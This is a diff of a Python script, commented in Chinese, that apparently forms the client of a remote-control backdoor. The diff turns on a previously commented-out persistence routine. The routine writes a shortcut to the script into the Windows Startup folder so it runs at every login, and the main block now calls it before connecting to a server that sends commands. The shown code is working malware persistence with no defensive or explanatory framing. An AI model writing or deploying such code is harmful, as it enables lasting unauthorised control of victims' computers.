@@ -13,21 +13,21 @@ server_list = [
 current_dir = os.getcwd()
 script_path = os.path.abspath(sys.argv[0])
 
-#def startup_main(exe_path): #开机自启动模块
-#    try:
-#        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-#        os.makedirs(startup_folder, exist_ok=True)
-#        shortcut_path = os.path.join(startup_folder, os.path.basename(exe_path) + ".lnk")
-#        # 如果快捷方式不存在或指向的文件不正确，则创建新的快捷方式
-#        if not os.path.exists(shortcut_path) or os.path.realpath(shortcut_path) != exe_path:
-#            winshell.CreateShortcut(
-#                 Path=shortcut_path,
-#                Target=exe_path,
-#                Description="启动快捷方式",
-#                Icon=(exe_path, 0)
-#                )
-#    except Exception as e:
-#        return
+def startup_main(exe_path): #开机自启动模块
+    try:
+        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        os.makedirs(startup_folder, exist_ok=True)
+        shortcut_path = os.path.join(startup_folder, os.path.basename(exe_path) + ".lnk")
+        # 如果快捷方式不存在或指向的文件不正确，则创建新的快捷方式
+        if not os.path.exists(shortcut_path) or os.path.realpath(shortcut_path) != exe_path:
+            winshell.CreateShortcut(
+                 Path=shortcut_path,
+                Target=exe_path,
+                Description="启动快捷方式",
+                Icon=(exe_path, 0)
+                )
+    except Exception as e:
+        return
 
 def receive_commands(server_socket): #指令模块
     global current_dir
@@ -93,5 +93,5 @@ def connect_to_server(): #连接服务器模块
 
 if __name__ == "__main__":
     print(script_path)
-#    startup_main(script_path)
+    startup_main(script_path)
     connect_to_server() # 启动主连接
